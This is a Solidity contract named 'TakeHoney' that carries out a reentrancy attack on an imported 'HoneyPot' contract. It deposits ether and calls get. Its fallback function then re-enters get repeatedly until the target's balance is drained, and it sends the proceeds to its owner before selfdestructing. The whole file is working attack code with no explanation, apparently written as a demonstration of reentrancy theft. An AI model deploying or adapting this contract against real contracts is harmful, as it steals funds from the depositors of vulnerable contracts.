pragma solidity ^0.4.6;

import "./HoneyPot.sol";


contract TakeHoney
{
    address owner;
    HoneyPot hp;

    modifier onlyowner
    {
        require(owner==msg.sender);
        _;
    }


    function TakeHoney (address honeyPotAddr)
        public
    {
        owner = msg.sender;
        hp = HoneyPot(honeyPotAddr); // instance
    }

    
    function callPut() 
        public
        payable
        onlyowner
    {
        require(msg.value>0);
        hp.put.value(msg.value)();
        hp.get.gas(3000000)();
    }
    
    
    function withdraw()
        public
        onlyowner
    {
        msg.sender.transfer(this.balance);
    }
    
    function () 
        public
        payable
    {
        // recall get untill balance > 0
        if(hp.balance>0 )
            hp.get();      
            
    }
    
    function killMe() 
      public
      onlyowner
      returns (bool) 
    {
      selfdestruct(owner);
      return true;
    }
}